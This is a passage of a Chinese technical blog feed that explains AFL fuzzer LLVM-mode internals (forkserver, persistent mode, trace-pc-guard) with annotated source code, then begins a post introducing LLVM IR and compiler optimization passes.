<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __AFL_HAVE_MANUAL_CONTROL 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __AFL_INIT() \</span></span><br><span class="line">  <span class="keyword">do</span> &#123; \</span><br><span class="line">      <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">char</span> *_A __attribute__((used));  \</span><br><span class="line">      _A = (<span class="keyword">char</span>*)<span class="string">"##SIG_AFL_DEFER_FORKSRV##"</span>; \</span><br><span class="line">      __attribute__((visibility(<span class="string">"default"</span>))) <span class="keyword">void</span> _I(<span class="keyword">void</span>) __asm__(<span class="string">"__afl_manual_init"</span>); \</span><br><span class="line">      _I(); \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>__AFL_INIT()</code>内部调用<code>__afl_manual_init</code>函数。该函数的源代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* This one can be called from user code when deferred forkserver mode</span></span><br><span class="line"><span class="comment">  is enabled. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __afl_manual_init(<span class="keyword">void</span>) &#123;</span><br><span class="line">  <span class="comment">// 注意init_done是静态的，这意味着只会初始化一次</span></span><br><span class="line">  <span class="keyword">static</span> u8 init_done;</span><br><span class="line">  <span class="comment">// 如果还没有被初始化</span></span><br><span class="line">  <span class="keyword">if</span> (!init_done) &#123;</span><br><span class="line">    <span class="comment">// 初始化共享内存</span></span><br><span class="line">    __afl_map_shm();</span><br><span class="line">    <span class="comment">// 开始执行forkserver</span></span><br><span class="line">    __afl_start_forkserver();</span><br><span class="line">    init_done = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在<code>__afl_map_shm</code>函数中，程序会读取特定的环境变量<code>__AFL_SHM_ID</code>。如果<code>__AFL_SHM_ID</code>被设置了，则将共享内存映射到当前虚拟内存中，并将地址赋值给<code>__afl_area_ptr</code>。否则，默认的<code>__afl_area_ptr</code>指向的是一个数组。<br>
该数组的存在是必须的，因为如果程序对宏定义<code>__AFL_INIT()</code>的插入点比较靠后（或者甚至没有插入宏定义），那么宏定义前的代码插桩点就必须要有一块内存用于输出。而这块初始的内存不需要与AFL共享，因为AFL不关心在<code>__AFL_INIT()</code>前的代码插桩。</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Globals needed by the injected instrumentation. The __afl_area_initial region</span></span><br><span class="line"><span class="comment">is used for instrumentation output before __afl_map_shm() has a chance to run.</span></span><br><span class="line"><span class="comment">It will end up as .comm, so it shouldn't be too wasteful. */</span></span><br><span class="line"><span class="comment">// __afl_area_initial是一块用于代码插桩输出的内存（非共享），直到执行__afl_map_shm将__afl_area_ptr指向一块共享内存为止。</span></span><br><span class="line">u8  __afl_area_initial[MAP_SIZE];</span><br><span class="line">u8* __afl_area_ptr = __afl_area_initial;</span><br></pre></td></tr></table></figure>
<p>环境变量<code>__AFL_SHM_ID</code>会在<code>afl-fuzz</code>中被设置。如果该环境变量存在，则可以间接表明当前程序是<code>afl-fuzz</code>的子进程。<br>
以下是<code>__afl_map_shm</code>函数源码</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* SHM setup. */</span></span><br><span class="line"><span class="comment">// 映射共享内存到当前虚拟内存中</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __afl_map_shm(<span class="keyword">void</span>) &#123;</span><br><span class="line">  u8 *id_str = getenv(SHM_ENV_VAR);</span><br><span class="line">  <span class="comment">/* If we're running under AFL, attach to the appropriate region, replacing the</span></span><br><span class="line"><span class="comment">    early-stage __afl_area_initial region that is needed to allow some really</span></span><br><span class="line"><span class="comment">    hacky .init code to work correctly in projects such as OpenSSL. */</span></span><br><span class="line">  <span class="keyword">if</span> (id_str) &#123;</span><br><span class="line">    u32 shm_id = atoi(id_str);</span><br><span class="line">    __afl_area_ptr = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">/* Whooooops. */</span></span><br><span class="line">    <span class="keyword">if</span> (__afl_area_ptr == (<span class="keyword">void</span> *)<span class="number">-1</span>) _exit(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">/* Write something into the bitmap so that even with low AFL_INST_RATIO,</span></span><br><span class="line"><span class="comment">      our parent doesn't give up on us. */</span></span><br><span class="line">    __afl_area_ptr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>__afl_start_forkserver</code>函数稍微有些复杂，因为其中涉及到了进程的通信与复制。</p>
<blockquote>
<p>为便于说明，约定：<strong>父进程</strong>指的是afl-fuzz，<strong>当前进程</strong>指的是forkserver，<strong>子进程</strong>指的是从forkserver fork出的、用于fuzz测试的进程。</p>
</blockquote>
<p>当<code>afl-fuzz</code>启动目标程序后，目标程序会执行如下步骤</p>
<ul>
<li>当前目标程序成为forkserver，先向父进程afl-fuzz发送信息，告知forkserver状态良好</li>
<li>forkserver将会fork自身，创建出子进程。同时forkserver还会向父进程告知子进程的pid，并等待子进程暂停</li>
<li>子进程暂停后，向父进程发送子进程的status，以便于父进程检测子进程的暂停原因</li>
<li>如果子进程暂停但没有超时，则重启这个暂停的子进程<br>
如果这个子进程暂停并且也超时了，则forkserver等待子进程彻底结束（父进程会kill掉子进程），之后fork出一个新的子进程，重复之前的操作。</li>
</ul>
<p>fuzzer并不负责fork子进程，而是与这个fork server通信，并由fork server来完成fork及继续执行目标的操作。这样设计的最大好处，就是不需要调用execve()，从而节省了载入目标文件和库、解析符号地址等重复性工作。</p>
<p>详细信息都以注释的形式标注在代码中，其函数代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Fork server logic. */</span></span><br><span class="line"><span class="comment">/// @note 该函数的代码请结合 afl-fuzz.c中的init_forkserver与run_target函数来理解</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __afl_start_forkserver(<span class="keyword">void</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> u8 tmp[<span class="number">4</span>];</span><br><span class="line">  s32 child_pid;</span><br><span class="line"></span><br><span class="line">  u8  child_stopped = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Phone home and tell the parent that we're OK. If parent isn't there,</span></span><br><span class="line"><span class="comment">    assume we're not running in forkserver mode and just execute program. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// forkserver向管道内写入数据，告知父进程afl-fuzz，当前进程forkserver状态良好</span></span><br><span class="line">  <span class="comment">// tmp数组没有初始化也无关紧要，因为afl-fuzz只判断读取到的字节数</span></span><br><span class="line">  <span class="keyword">if</span> (write(FORKSRV_FD + <span class="number">1</span>, tmp, <span class="number">4</span>) != <span class="number">4</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    u32 was_killed;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Wait for parent by reading from the pipe. Abort if read fails. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// was_killed 对应父进程的child_timed_out，当子进程超时，则父进程会kill子进程</span></span><br><span class="line">    <span class="keyword">if</span> (read(FORKSRV_FD, &amp;was_killed, <span class="number">4</span>) != <span class="number">4</span>) _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we stopped the child in persistent mode, but there was a race</span></span><br><span class="line"><span class="comment">      condition and afl-fuzz already issued SIGKILL, write off the old</span></span><br><span class="line"><span class="comment">      process. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    child_stopped == 0  =&gt; 子进程已彻底结束（就是已经确定子进程已经真正的结束了）</span></span><br><span class="line"><span class="comment">    child_stopped == 1  =&gt; 子进程处于暂停状态，或结束状态（可能还没彻底结束）</span></span><br><span class="line"><span class="comment">            （暂停状态可能是因为子进程发出了signals）</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 如果子进程已被kill，但进程处于暂停或结束状态</span></span><br><span class="line">    <span class="keyword">if</span> (child_stopped &amp;&amp; was_killed) &#123;</span><br><span class="line">      <span class="comment">// 等待子进程彻底结束</span></span><br><span class="line">      child_stopped = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (waitpid(child_pid, &amp;status, <span class="number">0</span>) &lt; <span class="number">0</span>) _exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果子进程已彻底结束</span></span><br><span class="line">    <span class="keyword">if</span> (!child_stopped) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Once woken up, create a clone of our process. */</span></span><br><span class="line">      <span class="comment">// fork一份子进程</span></span><br><span class="line">      child_pid = fork();</span><br><span class="line">      <span class="keyword">if</span> (child_pid &lt; <span class="number">0</span>) _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* In child process: close fds, resume execution. */</span></span><br><span class="line">      <span class="comment">// 如果当前进程是fork出的子进程，则关闭管道，返回，执行真正的程序</span></span><br><span class="line">      <span class="keyword">if</span> (!child_pid) &#123;</span><br><span class="line"></span><br><span class="line">        close(FORKSRV_FD);</span><br><span class="line">        close(FORKSRV_FD + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Special handling for persistent mode: if the child is alive but</span></span><br><span class="line"><span class="comment">        currently stopped, simply restart it with SIGCONT. */</span></span><br><span class="line">      <span class="comment">// 如果子进程只是暂停，</span></span><br><span class="line">      <span class="comment">// 重新开始这个停止的子进程</span></span><br><span class="line">      kill(child_pid, SIGCONT);</span><br><span class="line">      child_stopped = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In parent process: write PID to pipe, then wait for child. */</span></span><br><span class="line">    <span class="comment">// forkserver将自己的子进程pid告知给父进程afl-fuzz</span></span><br><span class="line">    <span class="keyword">if</span> (write(FORKSRV_FD + <span class="number">1</span>, &amp;child_pid, <span class="number">4</span>) != <span class="number">4</span>) _exit(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">/* 如果全局变量is_persistent == 1，则说明当前处于persistent mode</span></span><br><span class="line"><span class="comment">          此时等待forkserver的子进程停止（注意：是停止不是结束）</span></span><br><span class="line"><span class="comment">          因为在persistent mode的代码范围内，可能会发出signals暂停程序</span></span><br><span class="line"><span class="comment">          这里只要捕获进程暂停就好</span></span><br><span class="line"><span class="comment">      如果当前不是persistent mode，则等待子进程正常退出</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (waitpid(child_pid, &amp;status, is_persistent ? WUNTRACED : <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In persistent mode, the child stops itself with SIGSTOP to indicate</span></span><br><span class="line"><span class="comment">      a successful run. In this case, we want to wake it up without forking</span></span><br><span class="line"><span class="comment">      again. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当子进程接收到停止信号（此时子进程可能暂停，可能结束）</span></span><br><span class="line">    <span class="keyword">if</span> (WIFSTOPPED(status)) child_stopped = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Relay wait status to pipe, then loop back. */</span></span><br><span class="line">    <span class="comment">// 将等待状态中继到管道</span></span><br><span class="line">    <span class="keyword">if</span> (write(FORKSRV_FD + <span class="number">1</span>, &amp;status, <span class="number">4</span>) != <span class="number">4</span>) _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>LLVM_mode 的第二种特殊功能 —— <strong>persistent mode</strong><br>
由于某些库所提供的API是无状态的，又或者可以在处理不同的输入样本之间重置其状态。<br>
当API重置后，一个长期活跃的进程就可以被重复使用，这样可以消除重复执行fork函数以及OS相关所需要的开销<br>
使用示例</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (__AFL_LOOP(<span class="number">1000</span>)) &#123;</span><br><span class="line">  <span class="comment">/* Read input data. */</span></span><br><span class="line">  <span class="comment">/* Call library code to be fuzzed. */</span></span><br><span class="line">  <span class="comment">/* Reset state. */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Exit normally */</span></span><br></pre></td></tr></table></figure>
<p>循环次数不能设置过大，因为较小的循环次数可以将内存泄漏和类似故障的影响降到最低。所以循环次数设置成1000是个不错的选择。</p>
<ul>
<li>
<p><code>__AFL_LOOP</code>与<code>__AFL_INIT</code>类似，其宏定义都由<code>afl-clang-fast</code>传递</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __AFL_LOOP(_A)  \</span></span><br><span class="line">(&#123; \</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">char</span> *_B __attribute__((used));  \</span><br><span class="line">    _B = (<span class="keyword">char</span>*)<span class="string">"##SIG_AFL_PERSISTENT##"</span>; \</span><br><span class="line">    __attribute__((visibility(<span class="string">"default"</span>))) <span class="keyword">int</span> _L(<span class="keyword">unsigned</span> <span class="keyword">int</span>) __asm__(<span class="string">"__afl_persistent_loop"</span>); \</span><br><span class="line">    _L(_A); \</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>宏定义<code>__AFL_LOOP</code>内部调用<code>__afl_persistent_loop</code>函数。<br>
需要注意的是每次fuzz过程都会改变一些进程或线程的状态变量，因此，在复用这个fuzz子进程的时候需要将这些变量恢复成初始状态，否则会导致下一次fuzz过程的不准确。从该函数的源代码中可以看到，状态初始化的工作只会在第一个循环中进行，之后的初始化工作都交给父进程。<br>
该函数的源代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* A simplified persistent mode handler, used as explained in README.llvm. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __afl_persistent_loop(<span class="keyword">unsigned</span> <span class="keyword">int</span> max_cnt) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> u8  first_pass = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">static</span> u32 cycle_cnt;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (first_pass) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Make sure that every iteration of __AFL_LOOP() starts with a clean slate.</span></span><br><span class="line"><span class="comment">      On subsequent calls, the parent will take care of that, but on the first</span></span><br><span class="line"><span class="comment">      iteration, it's our job to erase any trace of whatever happened</span></span><br><span class="line"><span class="comment">      before the loop. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_persistent) &#123;</span><br><span class="line">     <span class="comment">// 重置共享内存</span></span><br><span class="line">      <span class="built_in">memset</span>(__afl_area_ptr, <span class="number">0</span>, MAP_SIZE);</span><br><span class="line">      __afl_area_ptr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">      __afl_prev_loc = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cycle_cnt  = max_cnt;</span><br><span class="line">    first_pass = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (is_persistent) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (--cycle_cnt) &#123;</span><br><span class="line"></span><br><span class="line">      raise(SIGSTOP);</span><br><span class="line"></span><br><span class="line">      __afl_area_ptr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">      __afl_prev_loc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When exiting __AFL_LOOP(), make sure that the subsequent code that</span></span><br><span class="line"><span class="comment">        follows the loop is not traced. We do that by pivoting back to the</span></span><br><span class="line"><span class="comment">        dummy output region. */</span></span><br><span class="line"></span><br><span class="line">      __afl_area_ptr = __afl_area_initial;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>全局变量<code>is_persistent</code>会在执行函数<code>__afl_auto_init</code>时被设置。</p>
<blockquote>
<p><code>__afl_auto_init</code>函数会被afl-fuzz自动调用。</p>
</blockquote>
<p>当<code>is_persistent</code>被设置为1时，<code>__AFL_LOOP</code>才会进入<code>persistent mode</code>.<br>
<code>__afl_auto_init</code>函数的代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Proper initialization routine. */</span></span><br><span class="line"></span><br><span class="line">__attribute__((constructor(CONST_PRIO))) <span class="keyword">void</span> __afl_auto_init(<span class="keyword">void</span>) &#123;</span><br><span class="line"></span><br><span class="line">  is_persistent = !!getenv(PERSIST_ENV_VAR);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (getenv(DEFER_ENV_VAR)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  __afl_manual_init();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要注意的是，当afl-fuzz使用forkserver时，<code>__afl_auto_init</code>函数会直接return。<br>
这似乎意味着<code>deferred instrumentation</code>与<code>persistent mode</code>互斥。</p>
</li>
</ul>
</li>
<li>
<p>LLVM_mode 的第三种特殊功能 —— <strong>trace-pc-guard mode</strong><br>
新版LLVM内置了<a href="http://clang.llvm.org/docs/SanitizerCoverage.html#tracing-pcs-with-guards" target="_blank" rel="noopener">trace-pc-guard mode</a><br>
如果想尝试一下这个功能，则需要执行这条代码来<strong>重新编译</strong>afl-clang-fast</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AFL_TRACE_PC=1 make clean all</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>函数<code>__sanitizer_cov_trace_pc_guard</code>会在每个基础块的边界被调用。该函数利用函数参数<code>guard</code>所指向的值来确定共享内存上所对应的地址。<br>
其中AFL所实现的这部分代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The following stuff deals with supporting -fsanitize-coverage=trace-pc-guard.</span></span><br><span class="line"><span class="comment">It remains non-operational in the traditional, plugin-backed LLVM mode.</span></span><br><span class="line"><span class="comment">For more info about 'trace-pc-guard', see README.llvm.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The first function (__sanitizer_cov_trace_pc_guard) is called back on every</span></span><br><span class="line"><span class="comment">edge (as opposed to every basic block). */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 每个边界都有其不同(可能相同)的guard值</span></span><br><span class="line"><span class="keyword">void</span> __sanitizer_cov_trace_pc_guard(<span class="keyword">uint32_t</span>* guard) &#123;</span><br><span class="line">  __afl_area_ptr[*guard]++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，这个函数与AFL-llvm-Pass中的代码插桩有异曲同工之妙。</p>
</li>
<li>
<p>函数<code>__sanitizer_cov_trace_pc_guard_init</code>将会被编译器插入至Module的构造函数之前。<br>
这个函数的功能是设置各个基础块<code>guard</code>指针所指向的值。<br>
在正常情况下，各个基础块<code>guard</code>指针所指向的值是不相同的，但在这里可以通过代码插桩率，利用该值来随机插桩。<br>
以下是函数源代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Init callback. Populates instrumentation IDs. Note that we're using</span></span><br><span class="line"><span class="comment">ID of 0 as a special value to indicate non-instrumented bits. That may</span></span><br><span class="line"><span class="comment">still touch the bitmap, but in a fairly harmless way. */</span></span><br><span class="line"><span class="keyword">void</span> __sanitizer_cov_trace_pc_guard_init(<span class="keyword">uint32_t</span>* start, <span class="keyword">uint32_t</span>* stop) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置代码插桩率</span></span><br><span class="line">  u32 inst_ratio = <span class="number">100</span>;</span><br><span class="line">  u8* x;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (start == stop || *start) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  x = getenv(<span class="string">"AFL_INST_RATIO"</span>);</span><br><span class="line">  <span class="keyword">if</span> (x) inst_ratio = atoi(x);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!inst_ratio || inst_ratio &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"[-] ERROR: Invalid AFL_INST_RATIO (must be 1-100).\n"</span>);</span><br><span class="line">    <span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure that the first element in the range is always set - we use that</span></span><br><span class="line"><span class="comment">    to avoid duplicate calls (which can happen as an artifact of the underlying</span></span><br><span class="line"><span class="comment">    implementation in LLVM). */</span></span><br><span class="line">  <span class="comment">// 从第一个guard开始向后遍历，设置guard指向的值</span></span><br><span class="line">  *(start++) = R(MAP_SIZE - <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (start &lt; stop) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (R(<span class="number">100</span>) &lt; inst_ratio) *start = R(MAP_SIZE - <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 如果当前基础块因概率而选择不插桩，则设置当前基础块的guard值指向的值为0</span></span><br><span class="line">    <span class="keyword">else</span> *start = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    start++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h2 id="5-参考">5. 参考</h2>
<ul>
<li><a href="https://rk700.github.io/2017/12/28/afl-internals/" target="_blank" rel="noopener">AFL内部实现细节小记</a></li>
<li><a href="https://blog.csdn.net/qq_38081870/article/details/106600627" target="_blank" rel="noopener">afl中llvm_mode下的afl-llvm-pass.so.cc源码解析</a></li>
<li><a href="https://github.com/google/AFL/blob/master/llvm_mode/README.llvm" target="_blank" rel="noopener">AFL LLVM-mode README</a></li>
<li><a href="http://galaxylab.com.cn/afl%E6%A1%86%E6%9E%B6llvm%E6%A8%A1%E5%BC%8F%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/" target="_blank" rel="noopener">AFL框架LLVM模式源码解析</a></li>
<li><a href="http://clang.llvm.org/docs/SanitizerCoverage.html#tracing-pcs-with-guards" target="_blank" rel="noopener">Clang - SanitizerCoverage</a></li>
</ul>
]]></content>
      <categories>
        <category>天问之路</category>
      </categories>
      <tags>
        <tag>LLVM</tag>
        <tag>AFL</tag>
      </tags>
  </entry>
  <entry>
    <title>代码优化与LLVM IR pass</title>
    <url>/2020/06/LLVM-IR-pass/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<ul>
<li>LLVM IR(Intermediate Representation) 是LLVM的一种中间表示，也可以将它视为中间代码。
<blockquote>
<p><strong>中间代码</strong> 的生成是为了便于更好的 <strong>代码优化</strong>。</p>
</blockquote>
</li>
<li>LLVM Pass 是LLVM代码优化（optimization）中的一个重要组成部分。为便于理解，我们可以将Pass看作一个又一个的模块，各个Pass可以通过IR获取信息为下一个Pass做好准备，又或者直接对中间代码进行优化。
<blockquote>
<p>代码优化的实质：分析(Analysis)+转换(Transformation)</p>
</blockquote>
</li>
<li><a href="http://www.cs.toronto.edu/~pekhimenko/courses/cscd70-w20/" target="_blank" rel="noopener">CSCD70</a>是多伦多大学涉及代码优化的一门课程，配套 <a href="https://github.com/ArmageddonKnight/CSCD70" target="_blank" rel="noopener">github</a>上的课件与作业</li>
</ul>
<blockquote>
<p>注：本文所设计到的代码优化类型并不全面，仅记录下笔者所学的类型。</p>
</blockquote>
<a id="more"></a>
<h2 id="1-基础知识">1. 基础知识</h2>
<ul>
<li>
<p>基本块（BasicBlock）</p>
<blockquote>
<p>基本块是满足下列条件的 <strong>最大</strong> 的 <strong>连续</strong> 中间表示指令序列</p>
</blockquote>
<ul>
<li>控制流只能从基本块的 <strong>第一个指令</strong> 进入该块。
<blockquote>
<p>也就是说，没有跳转到基本块中间的或末尾指令的转移指令</p>
</blockquote>
</li>
<li>除了基本块的最后一个指令，控制流在离开基本块之前不会跳转或停机</li>
</ul>
</li>
<li>
<p>流图（FlowGraghs）</p>
<ul>
<li>流图的结点是一些 <strong>基本块</strong></li>
<li>从基本块B到基本块C的之前有一条边，<strong>当且仅当</strong> 基本块C的第一个指令 <strong>可能</strong> 紧跟在B的最后一条指令之后执行。
<blockquote>
<p>此时称，B是C的 <strong>前驱</strong> (predecessor)，C是B的 <strong>后继</strong> (successor)</p>
</blockquote>
<ul>
<li>确认该边的方式
<ul>
<li>有一个 <strong>从B的结尾跳转到C的开头</strong> 的条件或无条件跳转语句</li>
<li>按照原来的中间代码序列的顺序，C紧跟在之B后，且B的结尾不存在无条件跳转语句</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>常用的代码优化方法</p>
<ul>
<li><strong>删除公共子表达式</strong>
<blockquote>
<p>如果表达式<code>x op y</code>先前已被计算过，并且从先前的计算到现在，<code>x op y</code>中的变量值没有改变，则<code>x op y</code>的这次出现就称为公共子表达式（common subexpression）</p>
</blockquote>
</li>
<li><strong>删除无用代码</strong>
<blockquote>
<p>无用代码(Dead-code)：其计算结果永远不会被使用的语句</p>
</blockquote>
</li>
<li><strong>常量合并</strong>
<blockquote>
<p>如果在编译时刻推导出一个表达式的值是常量，就可以使用该常量来替代这个表达式。该技术被称为 <strong>常量合并</strong></p>
</blockquote>
</li>
<li><strong>代码移动</strong>
<blockquote>
<p>这个转换的结果是那些 <strong>不管循环多少次都得到相同结果的表达式</strong>（即循环不变计算，loop-invariant computation），在进入循环之前就对它们进行求值。</p>
</blockquote>
</li>
<li><strong>强度削弱</strong>
<blockquote>
<p>用较快的操作代替较慢的操作，如用 <strong>加</strong> 代替 <strong>乘</strong> 。（例：2*x ⇒ x+x）</p>
</blockquote>
</li>
<li><strong>删除归纳变量</strong>
<blockquote>
<p>对于一个变量x ，如果存在一个正的或负的常数c使得每次x被赋值时它的值总增加c ，那么x就称为归纳变量(Induction Variable)。在沿着循环运行时，如果有一组归纳变量的值的变化保持步调一致，常常可以将这组变量删除为只剩一个</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h2 id="2-IR语法初探">2. IR语法初探</h2>
<p>测试代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> g;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x &lt; <span class="number">0</span>)</span><br><span class="line">        x = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> val1 = x + <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> kkk = val1 + <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> val2 = <span class="number">2</span> * x;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> val3_1 = x + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> val3_2 = val3_1 - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> val1 + val2 + val3_1 + val3_2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将上文中的C++代码用<code>clang</code>编译后生成的IR如下</p>
<blockquote>
<p>注意： 用clang编译时，需要设置<code>-O0 -disable-O0-optnone</code>这两项flag，以取消<code>clang</code>自身的代码优化</p>
</blockquote>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">; 一个文件一个模块（Module）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; ModuleID = './tests/algebra.bc'</span></span><br><span class="line">source_filename = <span class="string">"./tests/algebra.c"</span></span><br><span class="line">target datalayout = <span class="string">"e-m:e-i64:64-f80:128-n8:16:32:64-S128"</span></span><br><span class="line">target triple = <span class="string">"x86_64-pc-linux-gnu"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 带有'@'的即为全局符号</span></span><br><span class="line">@g = <span class="meta">common</span> dso_local <span class="meta">global</span> i32 <span class="number">0</span>, <span class="meta">align</span> <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind uwtable</span></span><br><span 